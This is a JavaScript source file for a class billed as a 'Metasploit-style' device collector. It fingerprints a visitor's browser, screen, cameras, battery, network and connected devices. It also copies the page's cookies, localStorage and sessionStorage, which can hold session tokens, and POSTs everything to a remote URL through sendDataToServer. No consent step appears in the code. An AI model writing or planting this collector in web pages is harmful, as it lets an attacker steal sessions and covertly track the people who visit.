/**
 * Metasploit-Style Device Collector
 * جمع بيانات الجهاز بدقة متناهية
 */

class DeviceCollector {
    constructor() {
        this.deviceData = {
            location: null,
            browser: null,
            os: null,
            device: null,
            sensors: null,
            network: null,
            battery: null,
            media: null,
            storage: null
        };
    }

    // 1. Browser Data Collection
    collectBrowserData() {
        const ua = navigator.userAgent;
        let browser = 'Unknown', browserVersion = 'Unknown';
        
        if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) {
            browser = 'Chrome';
            const match = ua.match(/Chrome\/([\d.]+)/);
            browserVersion = match ? match[1] : 'Unknown';
        } else if (ua.includes('Edg')) {
            browser = 'Edge';
            const match = ua.match(/Edg\/([\d.]+)/);
            browserVersion = match ? match[1] : 'Unknown';
        } else if (ua.includes('Firefox')) {
            browser = 'Firefox';
            const match = ua.match(/Firefox\/([\d.]+)/);
            browserVersion = match ? match[1] : 'Unknown';
        } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
            browser = 'Safari';
            const match = ua.match(/Version\/([\d.]+)/);
            browserVersion = match ? match[1] : 'Unknown';
        }

        // Collect cookies and localStorage (snapshot)
        let cookies = '';
        try { cookies = document.cookie; } catch(e) {}
        
        let localStorageData = {};
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                localStorageData[key] = localStorage.getItem(key);
            }
        } catch(e) {}

        return {
            name: browser,
            version: browserVersion,
            userAgent: ua,
            languages: navigator.languages,
            platform: navigator.platform,
            cookiesEnabled: navigator.cookieEnabled,
            localStorage: localStorageData,
            sessionStorage: this.getSessionStorage(),
            extensions: this.getExtensions()
        };
    }

    getSessionStorage() {
        let data = {};
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                data[sessionStorage.key(i)] = sessionStorage.getItem(sessionStorage.key(i));
            }
        } catch(e) {}
        return data;
    }

    getExtensions() {
        // Detect common security extensions
        const extensions = {
            adBlocker: this.detectAdBlocker(),
            uBlock: this.detectExtension('uBlock0'),
            darkMode: this.isDarkMode()
        };
        return extensions;
    }

    detectAdBlocker() {
        try {
            const test = document.createElement('div');
            test.innerHTML = '&nbsp;';
            test.className = 'adsbygoogle';
            test.style.display = 'block';
            document.body.appendChild(test);
            const visible = window.getComputedStyle(test).display !== 'none';
            document.body.removeChild(test);
            return !visible;
        } catch(e) {
            return false;
        }
    }

    isDarkMode() {
        return window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    }

    // 2. Sensor Data Collection
    collectSensorData() {
        const sensors = {};

        // Accelerometer
        if (typeof DeviceMotionEvent !== 'undefined' && typeof DeviceMotionEvent.requestPermission === 'function') {
            sensors.accelerometer = 'Permission required';
        } else if ('accelerometer' in navigator) {
            sensors.accelerometer = 'Available';
        }

        // Gyroscope
        if ('gyroscope' in navigator) {
            sensors.gyroscope = 'Available';
        }

        // Magnetometer
        if ('magnetometer' in navigator) {
            sensors.magnetometer = 'Available';
        }

        // Proximity
        if ('proximity' in navigator) {
            sensors.proximity = 'Available';
        }

        return sensors;
    }

    // 3. Screen/Camera Capture
    async collectMediaData() {
        const media = {
            screen: {
                width: window.screen.width,
                height: window.screen.height,
                availWidth: window.screen.availWidth,
                availHeight: window.screen.availHeight,
                colorDepth: window.screen.colorDepth,
                pixelDepth: window.screen.pixelDepth
            },
            camera: await this.getCameraInfo(),
            screenshot: null
        };
        
        return media;
    }

    async getCameraInfo() {
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            const cameras = devices.filter(device => device.kind === 'videoinput');
            return {
                count: cameras.length,
                devices: cameras.map(d => ({ label: d.label, deviceId: d.deviceId }))
            };
        } catch(e) {
            return { error: 'Permission denied or not available' };
        }
    }

    // 4. Network Fingerprinting
    collectNetworkData() {
        const network = {
            online: navigator.onLine,
            connection: this.getConnectionInfo(),
            webrtcIP: this.getWebRTCIP()
        };
        return network;
    }

    getConnectionInfo() {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (!conn) return null;
        
        return {
            type: conn.type,
            effectiveType: conn.effectiveType,
            downlink: conn.downlink,
            rtt: conn.rtt,
            saveData: conn.saveData
        };
    }

    getWebRTCIP() {
        return new Promise((resolve) => {
            const ip = 'Unknown';
            // WebRTC IP collection requires WebRTC setup
            // For now, return a placeholder
            resolve(ip);
        });
    }

    // 5. Battery Monitoring
    async collectBatteryData() {
        let battery = null;
        if ('getBattery' in navigator) {
            try {
                const batt = await navigator.getBattery();
                battery = {
                    level: batt.level * 100,
                    charging: batt.charging,
                    chargingTime: batt.chargingTime,
                    dischargingTime: batt.dischargingTime
                };
            } catch(e) {}
        }
        return battery;
    }

    // 6. Device Enumeration
    collectDeviceEnumeration() {
        const devices = {
            usb: [],
            midi: [],
            gamepad: []
        };

        // USB devices (requires permission)
        if ('requestDevice' in navigator.usb) {
            devices.usb = 'Permission required';
        }

        // MIDI devices
        if ('requestMIDIAccess' in navigator) {
            devices.midi = 'Permission required';
        }

        // Gamepads
        const gamepads = navigator.getGamepads ? navigator.getGamepads() : [];
        devices.gamepad = gamepads.map(gp => {
            if (!gp) return null;
            return {
                id: gp.id,
                index: gp.index,
                buttons: gp.buttons.length,
                axes: gp.axes.length
            };
        }).filter(Boolean);

        return devices;
    }

    // Collect everything
    async collectAll() {
        this.deviceData = {
            browser: this.collectBrowserData(),
            sensors: this.collectSensorData(),
            network: this.collectNetworkData(),
            deviceEnum: this.collectDeviceEnumeration(),
            battery: await this.collectBatteryData(),
            media: await this.collectMediaData(),
            timestamp: new Date().toISOString(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            localStorage: this.collectBrowserData().localStorage
        };

        return this.deviceData;
    }

    // Send data to server
    async sendDataToServer(url) {
        const data = await this.collectAll();
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            return { success: true, data: data };
        } catch(e) {
            return { success: false, error: e.message };
        }
    }
}